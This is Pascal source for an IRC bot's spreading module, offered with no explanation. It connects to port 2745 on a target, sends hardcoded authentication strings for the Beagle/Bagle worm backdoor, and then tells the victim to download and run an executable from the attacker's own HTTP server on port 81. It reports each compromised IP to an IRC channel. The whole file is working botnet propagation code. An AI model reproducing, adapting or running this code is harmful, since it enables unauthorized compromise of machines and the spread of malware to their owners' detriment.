unit pBeagle;

interface

uses
  windows, winsock, Bot;

var
  BeagleAuth1: String = #$43#$FF#$FF#$FF#$30#$30#$30#$01#$0A#$1F#$2B#$28#$2B#$A1#$32#$01;
  BeagleAuth2: String = #$43#$FF#$FF#$FF#$30#$30#$30#$01#$0A#$28#$91#$A1#$2B#$E6#$60#$2F#$32#$8F#$60#$15#$1A#$20#$1A;

Function Beagle(IP: string; Version: Integer): bool;

implementation

function StrtoInt(const S: string): integer; var
E: integer; begin Val(S, Result, E); end;

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

Function Beagle(IP: string; Version: Integer): bool;
var
  BeagleAuth: String;
  Buffer: Array[0..8] Of Char;
  BotFile: String;
  FName: String;
  Ext: String;

  WSAData: TWSAData;
  Success: Bool;

  Sock: TSocket;
  Addr: TSockAddrIn;
begin
  Success := False;

  WSAStartUp(MakeWord(1,1), WSAData);
  Sock := Socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(2745);
  Addr.sin_addr.S_addr := inet_addr(pchar(IP));

  If Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS Then
  Begin
    Case Version Of
      1: BeagleAuth := BeagleAuth1;
      2: BeagleAuth := BeagleAuth2;
    End;

    If Send(Sock, BeagleAuth[1], Length(BeagleAuth), 0) <> SOCKET_ERROR Then
    Begin
      If Recv(Sock, Buffer, 8, 0) <> SOCKET_ERROR Then
      Begin
        Randomize;
        BotFile := 'http://'+GetIP+':81/'+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+'.exe';
        If Send(Sock, BotFile[1], Length(BotFile), 0) <> SOCKET_ERROR Then Success := True;
      End;
    End;
  End;

  CloseSocket(Sock);
  WsaCleanUp();

  If Success Then
  Begin

    If Version = 1 Then Inc(Beagle1);
    If Version = 2 Then Inc(Beagle2);
    SendData('PRIVMSG ##pktb :[Beagle'+IntToStr(Version)+']Exploited '+IP+#10);
  End;
end;

end.
 